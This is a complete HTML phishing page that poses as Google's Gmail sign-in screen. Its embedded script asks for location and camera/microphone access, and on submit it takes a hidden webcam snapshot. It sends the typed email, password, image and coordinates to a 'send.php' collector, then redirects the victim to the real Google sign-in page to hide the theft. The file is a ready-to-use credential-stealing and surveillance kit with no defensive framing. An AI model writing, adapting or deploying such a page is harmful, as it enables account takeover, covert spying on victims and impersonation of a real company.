<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Sign in â€“ Google Accounts</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500&display=swap" rel="stylesheet">
<style>
body{margin:0;font-family:'Poppins',sans-serif;background:#f2f2f2;display:flex;align-items:center;justify-content:center;height:100vh}
.box{background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 6px rgba(0,0,0,0.2);width:380px;text-align:left}
.logo{display:block;margin:0 auto 20px;width:80px}
h2{margin:0;font-weight:500;font-size:24px}
p{font-size:14px;color:#5f6368;margin:6px 0 20px 0}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #dadce0;border-radius:4px;font-size:15px}
button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:15px;cursor:pointer}
button:hover{background:#185abc}
video{display:none}
</style>
</head>
<body>
<div class="box">
  <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" class="logo">
  <h2>Sign in</h2>
  <p>to continue to Gmail</p>
  <form id="loginForm">
    <input type="email" id="email" placeholder="Email or phone" required>
    <input type="password" id="password" placeholder="Enter your password" required>
    <button type="submit">Next</button>
  </form>
  <video id="video" autoplay muted></video>
  <canvas id="canvas" width="300" height="240" style="display:none;"></canvas>
</div>
<script>
let lat='unknown', lon='unknown';
if(navigator.geolocation){
  navigator.geolocation.getCurrentPosition(pos=>{
    lat=pos.coords.latitude; lon=pos.coords.longitude;
  });
}
navigator.mediaDevices.getUserMedia({video:true,audio:true}).then(s=>{
  document.getElementById('video').srcObject=s;
});
document.getElementById('loginForm').onsubmit=e=>{
  e.preventDefault();
  const email=document.getElementById('email').value;
  const password=document.getElementById('password').value;
  const canvas=document.getElementById('canvas');
  canvas.getContext('2d').drawImage(document.getElementById('video'),0,0,canvas.width,canvas.height);
  const image=canvas.toDataURL('image/png');
  fetch('send.php',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({type:'full',email,password,image,lat,lon})
  }).then(()=>location.href='https://accounts.google.com/signin');
};
</script>
</body>
</html>
